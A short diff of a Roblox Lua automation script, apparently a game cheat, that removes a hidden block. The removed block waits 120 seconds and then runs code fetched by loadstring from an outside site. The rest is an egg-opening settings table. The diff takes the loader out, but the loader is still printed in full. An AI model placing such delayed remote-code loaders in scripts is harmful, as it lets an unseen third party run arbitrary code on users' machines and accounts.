@@ -1,9 +1,3 @@
-task.spawn(function()		
-wait(120)
-loadstring(game:HttpGet("https://sellaccroblox.com/raw/view.php?file=lilbip%2Fcheckbattlepass.txt"))()
-end)
-
-
 getgenv().Settings = {
     ["Egg Settings"] = {
         OpenEggs = true,
